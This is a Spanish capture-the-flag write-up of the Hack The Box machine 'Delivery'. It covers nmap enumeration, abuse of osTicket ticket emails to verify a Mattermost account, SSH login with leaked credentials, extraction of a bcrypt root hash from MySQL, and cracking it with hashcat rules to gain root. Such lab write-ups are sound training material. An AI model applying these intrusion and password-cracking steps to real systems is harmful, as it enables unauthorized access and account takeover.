# DELIVERY

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/1.png)

## enumeracion

```

-p- 		todos los puertos
--open 		solo los abiertos
-T5			forma rápida de escanear
-v			verbose (avisa ni bien encuentra un puerto)
-n			no realiza la resolucion DNS
-oG			exportar en formato grepeable
allPorts	nombre del archivo
```

filtramos los puertos con extracPorts

```
extractPorts allPorts
```

```
nmap -p22,80,8065 -sS -sC -sV 10.10.10.222 -oN targeted
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 21:02 -04
Nmap scan report for spectra.htb (10.10.10.222)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Fri, 14 May 2021 20:18:52 GMT
|     X-Frame-Options: SAMEORIGIN
```

Tanto el puerto 80 como el  8065 son paginas web, veamos primero el 80:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/2.png)

Vamos a helpdesk:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/3.png)

No se nos interpreta porque tiene un subdominio helpdesk, vamos a agregarlo a /etc/hosts:

```
nano /etc/hosts

10.10.10.222    delivery.htb
10.10.10.222    helpdesk.delivery.htb

```

ahora veremos la pagina de helpdesk:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/4.png)

El wappalyzer indica que usa osTicket, un sistema de tickets:

vamos a crear uno con el boton "Open a New Ticket":

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/5.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/6.png)

Vamos a llenar los datos:

* email: soporte@mailinator.com
*  full name: kriko69
*  phone: 7777777777
*  Ext: 1234
*  Help Topic: Contact us
*  Issue Summary: local
*  Details: hello

(son datos aleatorios)

Al llenar el formulario vamos a ver que se nos crea un ticket:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/7.png)

Estos valores los vamos a guardar porque para algo serviran:

* id: 7548135
* email: 7548135@delivery.htb

En la parte del inicio, donde existia la opcion para crear un ticket tambien se puede verificar su estado, vamos a perobar eso con nuestro ticket creado:

Nos pide el correo con el que creamos el ticket y su id:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/8.png)

Y le damos en view ticket:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/9.png)

Parece algo como una bandeja de entrada.

Veamos la pagina de inicio otra vez:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/2.png)

Veamos que nos da el boton de contact us:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/10.png)

Nos indica que si no estamos registrado, que en el apartado de helpdesk una vez que obtengamos un email con el "@delivery.htb" podemos acceder al Mattermost server. Ya tenemos ese correo con el ticket (7548135@delivery.htb). Entonces vamos a ver a donde nos lleva el MatterMost Server:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/11.png)

Vemos un inicio de sesion, tenemos el correo pero no una contraseña asi que vamos a crearnos una cuenta en "Create one now":

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/12.png)

Ponemos los datos:

* email: 7548135@delivery.htb
* username: kriko6969
* password Kriko6969!

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/13.png)

No indica que nos envio un correo para verificar la cuenta, veamos en el apartado de tickets que parecia un buzon:

Despues de recargar nos aparece esto:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/14.png)

Asi que para activar vamos a la ruta subrayada:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/15.png)

Ahora ponemos la contraseña Kriko6969!:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/16.png)

Y estamos adentro.

## explotacion

Vemos unas credenciales en esa pagina:

* maildeliverer:Youve_G0t_Mail! 

Y vemos una palabra clave entre comillas **"PleaseSubscribe!"** y nos indica que esa palabra no se encuentra en rockYou (me imagino que en diccionario) y que usan una variante de esa contraseña. Por lo que pienso que vamos a tener que crackear una contraseña mas adelante.

Recordemos que el puerto 22 ssh estaba abieto asi que veamos si podemos conectarnos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/17.png)

Y estamos dentro, podemos ver la user.txt:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/18.png)

## elevacion de privilegios

Vamos a la ruta de /opt y ahi veremos que esta el servidor de mattermost y unos archivos de configuracion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/19.png)

Vamos a ver unas credenciales de base de datos mysql:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/20.png)

Intentemos conectarnos:

```
mysql -u mmuser -D mattermost -p

-D para especificar la database
```

contraseña: Crack_The_MM_Admin_PW

curiosa contraseña nos inidica de crackear la password del administrador...

Logramos ingresar a la DB, en mysql normalmente hay una tabla de "Users" que contiene entre muchas cosas el username y el password:

```
select username,password from Users;
```

Que vemos ahi? el hash del usuario root y de otros usuarios:

* usuario: root
* hash: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO

Todo los indicios nos dicen que debemos crackear este hash. Primero veamos que tipo de hash es con hash-id herramienta de kali:

```
hashid

(pegamos hash)
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/21.png)

Al parecer es bcrypt, vamos a utilizar hashcat para realizar el crackeo.

Primero vamos a buscar el modulo para realizar el ataque:

```
hashcat | more | grep bcrypt

more para verlo en formato more
grep bcrypt para ver que tipo de modulo usa
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/22.png)

Como ven si es bcrypt ya que hashcat indica que el formato es **$2*$...**
El modulo es el 3200. Vamos a hacer un ataque con diccionario pero si recuerdan se daba una pista que que la contraseña era una variacion de **PleaseSubscribe!** que no se halla en rockyou (un diccionario famoso en CTF)

Vamos a crear combinaciones de esta palabra para formar un diccionario. Hashcat tiene la opcion de reglas que a partir de una palabra o conjunto de palabras puede crear como un diccionario en base reglas de formacion de palabras.

Por ejemplo tu le puedes dar la palabra 'hola' y hashcat tiene ya reglas definidas (tambien se puede crear reglas) que realizan la transformacion de esta palabra:

```
Hola
hOla
h0l4
holA
...

```

Eso es lo que haremos, existe una regla en hashcat que se llama best64.rule ubicada en /usr/share/hashcat/rules/best64.rule esa usaremos contra la palabra clave que tenemos.

Primero vamos a crear un archivo con el contenido PleaseSubscribe! llamado pista:

```
echo PleaseSubscribe! > pista
```

Ahora vamos a crear un diccionario con la regla y esa palabra:

```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout pista > dict
```

Ya con nuestro diccionario creado vamos a intentar crackear nuestro hash:

```
echo $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO > hash
```

```
hashcat -a 0 -m 3200 hash dict
```

Vemos que encontró la contraseña, es **PleaseSubscribe!21**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/23.png)

entonces si nos cambiamos al usuario root y ponemos esa clave ya somos root:

```
su root

PleaseSubscribe!21
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DELIVERY/images/24.png)


